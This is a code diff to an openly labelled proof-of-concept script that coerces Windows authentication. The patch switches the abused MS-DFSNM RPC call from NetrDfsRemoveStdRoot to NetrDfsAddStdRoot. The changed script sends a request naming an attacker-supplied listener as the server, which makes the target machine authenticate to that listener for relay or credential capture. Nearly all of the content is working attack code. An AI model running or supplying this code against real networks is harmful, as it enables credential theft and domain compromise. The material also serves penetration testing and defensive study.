@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 # File name          : coerce_poc.py
 # Author             : Podalirius (@podalirius_)
-# Date created       : 22 Jun 2022
+# Date created       : 01 July 2022
 
 
 import sys
@@ -38,16 +38,17 @@ def gen_random_name(length=8):
     return name
 
 
-class NetrDfsRemoveStdRoot(NDRCALL):
-    opnum = 13
+class NetrDfsAddStdRoot(NDRCALL):
+    opnum = 12
     structure = (
         ('ServerName', WSTR),  # Type: WCHAR *
         ('RootShare', WSTR),   # Type: WCHAR *
-        ('ApiFlags', DWORD)    # Type: DWORD
+        ('Comment', WSTR),     # Type: WCHAR *
+        ('ApiFlags', DWORD),   # Type: DWORD
     )
 
 
-class NetrDfsRemoveStdRootResponse(NDRCALL):
+class NetrDfsAddStdRootResponse(NDRCALL):
     structure = ()
 
 
@@ -117,14 +118,15 @@ class MS_DFSNM(RPCProtocol):
     version = "3.0"
     pipe = r"\PIPE\netdfs"
 
-    def NetrDfsRemoveStdRoot(self, listener):
+    def NetrDfsAddStdRoot(self, listener):
         if self.dce is not None:
-            print("[>] Calling NetrDfsRemoveStdRoot() ...")
+            print("[>] Calling NetrDfsAddStdRoot() ...")
             try:
-                request = NetrDfsRemoveStdRoot()
+                request = NetrDfsAddStdRoot()
                 request['ServerName'] = '%s\x00' % listener
                 request['RootShare'] = gen_random_name() + '\x00'
-                request['ApiFlags'] = 1
+                request['Comment'] = gen_random_name() + '\x00'
+                request['ApiFlags'] = 0
                 # request.dump()
                 resp = self.dce.request(request)
             except Exception as e:
@@ -134,8 +136,8 @@ class MS_DFSNM(RPCProtocol):
 
 
 if __name__ == '__main__':
-    print("Windows auth coerce using MS-DFSNM::NetrDfsRemoveStdRoot()\n")
-    parser = argparse.ArgumentParser(add_help=True, description="Proof of concept for coercing authentication with MS-DFSNM::NetrDfsRemoveStdRoot()")
+    print("Windows auth coerce using MS-DFSNM::NetrDfsAddStdRoot()\n")
+    parser = argparse.ArgumentParser(add_help=True, description="Proof of concept for coercing authentication with MS-DFSNM::NetrDfsAddStdRoot()")
 
     parser.add_argument("-u", "--username", default="", help="Username to authenticate to the endpoint.")
     parser.add_argument("-p", "--password", default="", help="Password to authenticate to the endpoint. (if omitted, it will be asked unless -no-pass is specified)")
@@ -176,6 +178,6 @@ if __name__ == '__main__':
     )
 
     if connected:
-        protocol.NetrDfsRemoveStdRoot(options.listener)
+        protocol.NetrDfsAddStdRoot(options.listener)
 
     sys.exit()
